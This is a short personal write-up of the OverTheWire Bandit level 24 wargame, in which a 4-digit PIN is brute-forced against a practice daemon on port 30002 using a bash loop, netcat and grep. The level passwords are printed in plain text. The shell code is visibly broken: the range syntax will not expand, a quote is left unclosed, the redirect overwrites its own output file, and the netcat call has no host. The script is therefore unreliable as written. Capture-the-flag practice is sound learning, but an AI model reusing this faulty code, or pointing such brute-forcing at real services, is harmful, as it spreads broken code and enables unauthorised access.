---
layout: base.njk
title: Bandit24
tags: txt
---
#COMPSCI
Key concepts: [[Brute Force]]
## senha para o server
```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Descrição
> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time


First, we are going to generate all our bruteforce inputs in a separate file called "pincodes"
```.sh
password='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'

for i in {0 .. 9}; do
        for j in {0 .. 9}; do
               for k in {0 .. 9}; do
                        for l in {0 .. 9}; do
                                echo "$password $i$j$k$l > .\pincodes.txt; 
                        done
                done
        done
done
```

then, to input this to our netcat connection, we can use the < > streams

```
netcat 30002 < pincodes.txt > password
```

this password file is going to have a ton of junk "Wrong! Please enter...". To filter out the junk, we will use an inverse search grep

```
grep -v 'Please' password
```

and this returns the answer!

```
 iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

